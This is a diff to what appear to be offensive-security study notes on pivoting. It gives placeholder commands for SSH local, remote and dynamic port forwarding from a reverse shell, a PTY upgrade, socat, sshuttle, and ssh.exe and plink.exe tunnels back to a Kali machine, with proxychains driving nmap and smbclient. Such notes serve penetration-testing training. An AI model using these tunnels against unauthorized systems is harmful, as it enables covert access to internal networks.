@@ -3651,24 +3651,42 @@ See: ["SSH Tunneling: Examples, Command, Server Config"](https://www.ssh.com/aca
 #### SSH Dynamic Port Forwarding
 1. From the reverse shell, run `ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>`
 2. Now we must direct our tools to use this proxy with ProxyChains
-   - Edit the ProxyChains configuration file `/etc/proxychains.conf` add the SOCKS5 proxy to it (`socks5  <IP-reverse-shell> <port to bind to>`).
-3. To run the tools through the SOCKS4 proxy, prepend each command with ProxyChains
+   - Edit the ProxyChains configuration file `/etc/proxychains.conf`, add the SOCKS5 proxy to it (`socks5  <IP-reverse-shell> <port to bind to>`).
+3. To run the tools through the SOCKS5 proxy, prepend each command with ProxyChains
    - Example with nmap: `sudo proxychains nmap -vvv -sT --top-ports=20 -Pn <IP>`
    - Example with SMB: `proxychains smbclient -L //<IP>/ -U <username> --password=<password>`
 
 #### SSH Remote Port Forwarding
 1. Start ssh on your local machine
-2. On the reverse shell: `ssh -N -R [bind_address:]port:host:hostport [username@address]`
-3. `[username@address]` of your local ssh
+2. On the reverse shell: `ssh -N -R [bind_address]:port:host:hostport [username@address]`
+   - Set `[bind_address]` as `127.0.0.1`
+   - `[username@address]` of your local ssh
 
 
 #### SSH Remote Dynamic Port Forwarding
+1. On the reverse shell, run `python3 -c 'import pty; pty.spawn("/bin/bash")'` and `ssh -N -R <PORT> [username@address]`
+   - `[username@address]` of your local ssh
+2. Edit the ProxyChains configuration file `/etc/proxychains.conf`, add the SOCKS5 proxy to it (`socks5  127.0.0.1 <PORT>`).
+3. To run the tools through the SOCKS5 proxy, prepend each command with ProxyChains
 
 
+#### Sshuttle
+1. Note: it requires root privileges on the SSH client and Python3 on the SSH server
+2. From the reverse shell, run `socat TCP-LISTEN:2222,fork TCP:<forward-IP>:<forward-PORT>`
+3. `sshuttle -r <ssh-connection-string> <subnet> ...`
+   - Specify the SSH connection string we want to use `<ssh-connection-string>` and the subnets that we want to tunnel through this connection (ex. `10.74.23.0/24 172.16.163.0/24`)
+
+
+### <ins>ssh.exe</ins>
+1. Start SSH server on Kali `sudo systemctl start ssh`
+2. Connect to the Windows machine. Note: OpenSSH bundled with Windows has to be higher than `7.6` for remote dynamic port forwarding
+3. `ssh -N -R <PORT> <kali>@<IP>`
+4. Edit the ProxyChains configuration file `/etc/proxychains.conf`, add the SOCKS5 proxy to it (`socks5  127.0.0.1 <PORT>`).
+5. To run the tools through the SOCKS5 proxy, prepend each command with ProxyChains
 
 ### <ins>Plink.exe</ins>
 
-The general format is: `plink.exe <user>@<kali> -R <kaliport>:<target-IP>:<target-port>`
+The general format is: `plink.exe <user>@<kali-IP> -R <kaliport>:<target-IP>:<target-port>`
 
 The first time plink connects to a host, it will attempt to cache the host key in the registry. For this reason, we should pipe the answer to the prompt with the `cmd.exe /c echo y` command. The final result will look like `cmd.exe /c echo y | plink.exe <user>@<kali> -R <kaliport>:<target-IP>:<target-port>`.
 
